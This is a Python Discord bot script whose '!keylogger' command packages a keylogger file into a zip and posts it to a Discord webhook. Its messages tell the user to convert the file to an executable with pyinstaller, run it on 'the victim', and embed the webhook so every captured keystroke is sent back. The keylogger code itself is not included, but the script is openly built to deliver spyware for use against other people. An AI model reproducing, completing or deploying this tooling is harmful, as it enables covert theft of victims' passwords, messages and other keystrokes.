import discord
from discord.ext import commands
import requests
import zipfile
from time import sleep
from os import system, remove

webhook_url = "WEBHOOK HERE"
token = "BOT TOKEN"
intents = discord.Intents.default()
intents.message_content = True



bot = commands.Bot(command_prefix='!', intents=intents)


@bot.event
async def on_ready():
    print("IM READY")



@bot.command(name="keylogger")
async def payload(ctx):
    await ctx.send("Preparing...")
    with open("codes.py", "rb") as c:
        codes = c.read()
    with open("keylogger.py", "wb") as f:
        f.write(codes)
        sleep(1)
    await ctx.send("The Thing Prepared Is A Keylogger Let You Know So When You Try This To The Man, You Will Get Every Key Pressed By The Man.")
    sleep(2)
    await ctx.send("Take the keylogger and pyinstaller in it and convert it to exe format, then run it to the victim and taste it...")


    with zipfile.ZipFile("payload.zip", "w") as zip:
        zip.write("keylogger.py")

    with open("payload.zip", "rb") as zip_file:
        payload_data = {
            "file": ("payload.zip", zip_file)
        }
        sleep(2)
        response = requests.post(webhook_url, files=payload_data)
        
        sleep(1)
        await ctx.send("**If I zipped this file while it was in exe form, it would be too big (Approximately 10mb) so this task is yours** I am giving the necessary codes, look and remember that \n\t\t**PUT THE WEBHOOK IN THE KEYLOGGER OR THE LOG WILL NOT COME TO YOU**\n Required codes: \n**pip install pyinstaller**\nAfter the installation, the py file is almost open with cmd. **I explained it like a trowel, if you search for pyinstaller a little more, you can add an icon or something.**")

    sleep(5)

    remove("payload.zip")
    remove("keylogger.py")

bot.run(token)
